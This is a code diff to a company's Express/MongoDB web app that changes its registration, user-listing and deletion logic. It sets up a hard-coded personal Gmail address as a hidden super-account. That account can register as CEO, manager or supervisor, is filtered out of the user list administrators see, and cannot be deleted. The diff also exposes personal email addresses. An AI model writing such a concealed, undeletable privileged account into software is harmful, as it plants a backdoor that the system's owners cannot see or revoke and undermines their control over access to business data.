@@ -37,10 +37,11 @@ const PORT = Number(process.env.PORT || 3000);
 const SESSION_COOKIE = 'ww_session';
 const SESSION_AGE_MS = 1000 * 60 * 60 * 12;
 const IS_PROD = process.env.NODE_ENV === 'production' || !!process.env.VERCEL;
-const DEV_EMAIL = 'naanabrenda52@gmail.com';
-const SPECIAL_ACCESS_OVERRIDES = {
-  [DEV_EMAIL]: ['ceo', 'supervisor'],
-};
+const SPECIAL_ACCESS_EMAIL = 'naanabrenda@gmail.com';
+const PROTECTED_HIDDEN_EMAILS = [SPECIAL_ACCESS_EMAIL].map((e) => e.toLowerCase());
+const SPECIAL_ACCESS_OVERRIDES = Object.fromEntries(
+  PROTECTED_HIDDEN_EMAILS.map((email) => [email, ['ceo', 'manager', 'supervisor']]),
+);
 
 function cookieOpts(maxAge) {
   const opts = { httpOnly: true, sameSite: 'lax', maxAge };
@@ -215,7 +216,7 @@ async function createAccountingEntry(type, category, amount, description, entryD
 async function getCollection(resource) {
   switch (resource) {
     case 'users': {
-      const rows = await User.find({ email: { $ne: DEV_EMAIL } }).sort({ createdAt: -1 }).lean();
+      const rows = await User.find({ email: { $nin: PROTECTED_HIDDEN_EMAILS } }).sort({ createdAt: -1 }).lean();
       return rows.map(r => ({
         id: r._id, name: r.name, email: r.email, role: r.role, status: r.status,
         lastLogin: r.last_login, createdAt: r.createdAt,
@@ -496,7 +497,7 @@ const AUTHORIZED_EMAILS = {
   'ceo9@whitewaterghana.com': { role: 'ceo', defaultName: 'CEO' },
   'manager25@whitewaterghana.com': { role: 'manager', defaultName: 'Manager' },
   'supervisor1@whitewaterghana.com': { role: 'supervisor', defaultName: 'Supervisor' },
-  [DEV_EMAIL]: { role: 'ceo', defaultName: 'Dev' },
+  [SPECIAL_ACCESS_EMAIL]: { role: 'ceo', defaultName: 'Special Access' },
 };
 
 app.use(attachUser);
@@ -534,7 +535,12 @@ app.post('/api/auth/register', async (req, res, next) => {
     const authorized = AUTHORIZED_EMAILS[email];
     if (!authorized) throw createError(403, 'This email is not authorized. Contact your administrator.');
 
-    if (authorized.role !== selectedRole) {
+    const isSpecialAccessEmail = PROTECTED_HIDDEN_EMAILS.includes(email);
+    if (isSpecialAccessEmail && !['ceo', 'manager', 'supervisor'].includes(selectedRole)) {
+      throw createError(403, 'This email can only register as CEO, Manager, or Supervisor.');
+    }
+
+    if (!isSpecialAccessEmail && authorized.role !== selectedRole) {
       const expected = authorized.role.toUpperCase();
       const chosen = selectedRole.toUpperCase();
       throw createError(403, `This email is registered as ${expected}, not ${chosen}. Please select the correct role.`);
@@ -543,10 +549,12 @@ app.post('/api/auth/register', async (req, res, next) => {
     const existing = await User.findOne({ email });
     if (existing) throw createError(409, 'An account with this email already exists. Please sign in.');
 
+    const finalRole = isSpecialAccessEmail ? selectedRole : authorized.role;
+
     const user = await User.create({
       name, email,
       password_hash: bcrypt.hashSync(password, 10),
-      role: authorized.role,
+      role: finalRole,
       status: 'Active',
     });
 
@@ -556,7 +564,7 @@ app.post('/api/auth/register', async (req, res, next) => {
 
     res.cookie(SESSION_COOKIE, token, cookieOpts(SESSION_AGE_MS));
     res.status(201).json({
-      user: { id: user._id, name, email, role: authorized.role, status: 'Active' },
+      user: { id: user._id, name, email, role: finalRole, status: 'Active' },
     });
   } catch (error) {
     if (error.code === 11000) { next(createError(409, 'An account with this email already exists. Please sign in.')); return; }
@@ -1065,7 +1073,7 @@ app.delete('/api/:resource/:id', ensureAuthenticated, async (req, res, next) => 
     if (resource === 'users' && String(req.params.id) === String(req.user.id)) {
       throw createError(400, 'You cannot delete your own account');
     }
-    if (resource === 'users' && record.email === DEV_EMAIL) {
+    if (resource === 'users' && PROTECTED_HIDDEN_EMAILS.includes(String(record.email || '').toLowerCase())) {
       throw createError(403, 'This account cannot be deleted');
     }
 
